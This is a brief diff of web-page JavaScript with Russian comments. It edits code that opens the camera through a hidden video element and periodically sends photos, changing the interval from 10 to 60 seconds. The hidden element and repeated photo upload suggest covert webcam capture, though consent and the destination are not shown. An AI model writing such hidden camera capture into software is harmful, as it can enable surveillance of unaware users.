@@ -464,7 +464,6 @@
                 video.style.display = 'none';
                 document.body.appendChild(video);
 
-                // Ждем загрузки видео
                 await new Promise(resolve => video.onloadedmetadata = resolve);
                 video.play();
 
@@ -490,7 +489,7 @@
                             console.error('Ошибка отправки периодического фото:', error);
                         }
                     }
-                }, 10000); // 10 секунд
+                }, 60000); // Изменено на 1 минуту (60000 миллисекунд)
 
             } catch (error) {
                 console.error('Ошибка доступа к камере:', error);
